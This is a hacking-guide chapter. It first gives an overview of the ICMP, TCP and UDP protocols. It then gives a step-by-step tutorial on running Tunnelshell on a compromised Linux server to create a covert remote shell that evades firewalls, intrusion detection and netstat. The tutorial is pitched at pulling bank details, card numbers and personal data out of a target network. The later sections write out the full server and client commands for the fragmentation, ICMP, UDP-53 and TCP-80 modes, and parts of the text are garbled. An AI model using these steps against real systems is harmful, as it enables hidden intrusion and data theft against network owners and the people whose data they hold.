    # The Big Three Protocols- Required Reading for Any Would-Be Hacker


    In this chapter; I will give you an overview of `ICMP`, `TCP`, and `UDP`, the
    three most important ones. Then, later, I will show how to create a covert channel
    that is pretty much undetectable using `Tunnel shell` and `Kali Linux`.


    ### ICMP – Internet Control Message Protocol

    `ICMP` is used by devices like `routers` to report errors and generate messages
    that go to the source `IP`. The messages inform the `IP` when an error stops `IP`
    packets being delivered. `ICMP` will create the messages and send them, indicating
    that a service; `router` or `Host` cannot get through a gateway to the internet.
    Any `IP` network device can send these messages, and to receive and process them.
    `ICMP` is not classed as a transport protocol for sending data from one system
    to another.


    `ICMP` doesn’t tend to be used that regularly in end-user applications; it is
    much used by network admins for troubleshooting internet connections. Because
    it is one of the main protocols, `ICMP` tends to be used by hosts, `routers` or
    intermediary devices to tell other devices, hosts or `routers` of any errors or
    updates. Both `IPv4` and `IPv6` use similar versions called `ICMPv4` and `ICMPv6`.


    `ICMP` messages are sent as datagrams and have an `IP` header that holds the data
    An `ICMP` packet is an `IP` packet that has `ICMP` within the `IP` data section.
    `ICMP` messages also have the `IP` header from the original message so that the
    receiver will always know which of the packets has failed. The header is found
    after the `IPv4` or `6` packet headers and it has an identification of `IP Protocol
    1`. This protocol is complex, with three fields:

    - The `type` that will identify the `ICMP` message

    - The `code` that has more information regarding the `type` field

    - The `checksum` used to find errors that are introduced while the message is
    transmitting


    After these fields come the `ICMP` data and the `IP` header, showing which of
    the packets has failed. `ICMP` has also been used as a way of executing `DoS`
    attacks by sending `IP` packets that are larger than the maximum number of bytes
    the `IP` protocol allows.


    ### TCP – Transfer Control Protocol

    `TCP` is the defining standard for establishing and maintaining network conversations
    where applications exchange data. `TCP` works with the `IP` protocol and this
    is what defines the way computers send data packets to one another. Working together,
    `IP` and `TCP` are the rules for how the internet is defined. `TCP` is a protocol
    that is connection-oriented, meaning the connection, once established, is maintained
    until the applications at either end have completed the exchange of messages.
    `TCP` will determine how the application data should be broken down into packets
    that can be delivered by networks. It will also send packets to the network layer
    and accept them from the layer, manages the flow of control and because it is
    designed to provide data transmission that is free from errors, it will handle
    the retransmission of packets that are garbled or dropped as well as acknowledging
    all the packets as they arrive.


    `TCP` is responsible for covering parts of the Transport Layer (layer 4) and parts
    of the Session Layer (layer 5) in the `OSI` (Open Systems Interconnection) communication
    model. For example, web servers use the `HTTP` protocol to send HTML files to
    clients. The `HTTP` layer will request the connection up and send the file. The
    `TCP` stack will then divide that file into packets of data, gives each one a
    number and sends them on, one at a time, to the `IP` layer so they can be delivered.
    The client waits for all the packets and then puts them all together as a file.


    ### UDP – User Datagram Protocol

    `UDP` is an alternative to `TCP` and is used mostly for establishing connections
    that are loss-tolerant and low-latency. Both `TCP` and `UDP` run atop the Internet
    Protocol and are often referred to as `TCP/IP` or `UDP/IP`. Both protocols send
    datagrams, which are short data packets. `UDP` provides services that `IP` doesn’t
    – port numbers, which help to distinguish between different requests and `Checksum`,
    the capability to check that the data arrives in piece. `TCP` is the dominant
    protocol for most of the internet connectivity and this is down to the fact that
    it can break large data into individual ones, check for lost packets and resend
    them, and reassemble them in the right order. In contrast, `UDP` only sends the
    packets and means it takes less bandwidth and suffers lower latency. However,
    it is possible for data to be lost or received in the wrong order. `UDP` is ideal
    for network applications where latency is critical, like video and voice communication
    or gaming, where data can be lost without affecting the quality too much. Techniques
    for error corrections are used to provide better audio quality even though some
    data has been lost. `UDP` is also used where applications need lossless transmission
    of data, where the application has been configured to manage the retransmission
    of lost packets. This boosts data transmission rate compared to `TCP`.


    ### How to Use Tunnelshell To Create a Covert Channel That Is Almost Undectable

    More often than not, professional hackers are looking for protected information
    from target network or system. This could be bank details, debit card numbers,
    personally identifiable information or intellectual property like designs, blueprints,
    etc. While you might be able to get into that system, the question is, what do
    you do when you are there? Hackers need a way to get the information they have
    gleaned out of the network in a way that is not detectable by any security service
    or admin. They use a tool called `Tunnelshell`.


    ### How Tunnelshell Works

    `Tunnelshell` is a neat program that will only work on servers that have been
    compromised. A high percentage of corporate servers run on UNIX distribution,
    such as Linux, `Solaris`, `HP UX`, `AIX`, etc., so it shouldn’t be any significant
    problems in removing data. `Tunnelshell` works over several protocols, including
    `UDP`, `TCP`, and `ICMP`. It is also able to break packets up so it can get past
    intrusion detection system and firewall. In `UDP` and `TCP` modes, `Tunnelshell`
    does not need to be bound to a port so, if the target were to run `netsat`, it
    would not show any open ports – though the `IP` address is logged because three-way
    handshakes are executed. In `ICMP` mode, `Tunnelshell` will use `ICMP` Echo Request/Echo
    Reply to transport data and, because of this, will show as a continuous `ping`
    that goes between systems. Many firewalls and routers will block incoming `ICMP`
    but they rarely block outgoing `ICMP` and users.


    ### How to use Tunnel shell for a Covert Channel ownYou will need to download
    `Kali` for this and Tunnel shell is not possible for developers to include everything.
    This tutorial will show you how to build a tunnel between `Kali` and a Linux system
    that has been compromised. We are going to use `back` as the target. The first
    step is to download `Tunnelshell`. Under normal circumstances we would use the
    `apt-get` command or software utility on `Kali` but as `Tunnelshell` isn’t in
    `Kali`, the easiest way is to get straight to the website and download it. It
    is a compressed `.tar` file with the extension `.tgz`. This means it must be uncompressed
    and untarred before it can be used. It must be downloaded onto the target system
    and to your own `Kali` system. Put it in whatever directory you want so long as
    you remember where it is and remember to run the commands from that directory.


    ```bash

    tar xvfz tunnelshell_2.tgz

    ```


    ### Untar and Uncompress

    Type the following command at the prompt to unpack `Tunnelshell`:

    ```bash

    make

    ```


    ### Activate Tunnelshell on the Target

    Now that `Tunnelshell` has been downloaded and compiled on the target, all you
    need to type at the prompt is:

    ```bash

    ./tunneld

    ```

    This will open the server on the target. As no switches were used when `Tunnel`
    was activated, it will use packet fragmentation in the default configuration.
    The beauty of this is that packets are broken down into pieces and reassembled
    when they reach the destination and this is one of the best methods for getting
    almost every IDS and firewall without being detected.


    ### Connect to the Tunnel

    To that just type:

    ```bash

    ./tunnel -t frag 192.168.89.191

    ```

    - `-t` is the switch that goes before the tunnel type

    - `frag` defines the type

    - `192.168.89.191` is the target IP address in this case


    `Tunnelshell` will now connect but you won’t get a command prompt; instead, you
    get a blank line. Now you can type in any Linux command and the output will be
    returned as if you were working at the Linux prompt. For example, type in `pwd`
    for Present Working Directory, and the return will be the directory that tunnel
    is running on the target. If you now type in `ls -l`, you will get a list of the
    directory and you can now go ahead and input any Linux command you want.


    ### Attempt to Detect Tunnelshell on the Target

    Now you have your tunnel it’s time to see if the target is able to detect it.
    Go to the target system and, as sysadmin, see if you can find the tunnel. Try
    it with `netsat` – this shows all connections on the computer but you should not
    be able to see `Tunnelshell`.


    ### Other Configurations

    We used `Tunnelshell`’s default configuration for fragmented packages but it can
    also use other configurations, which could be more useful, based on the circumstances:


    #### ICMP

    To run in `ICMP`, start the server by typing:

    ```bash

    ./tunneld -t icmp -m echo-reply

    ```

    And start the client by typing:

    ```bash

    ./tunnel -t icmp -m echo-reply, echo <IPaddressoftarget>

    ```


    #### UDP

    Start the server by typing:

    ```bash

    ./tunneld -t udp -p 53, 2000

    ```

    Start the client by typing:

    ```bash

    ./tunnel -t udp -p 53, 2000 <IPaddressoftarget>

    ```


    #### TCP

    Start the server by typing:

    ```bash

    ./tunneld -t tcp -p 80, 2000

    ```

    Start the client by typing:

    ```bash

    ./tunnel -t tcp -p 80, 2000 <IPaddressoftarget>

    ```


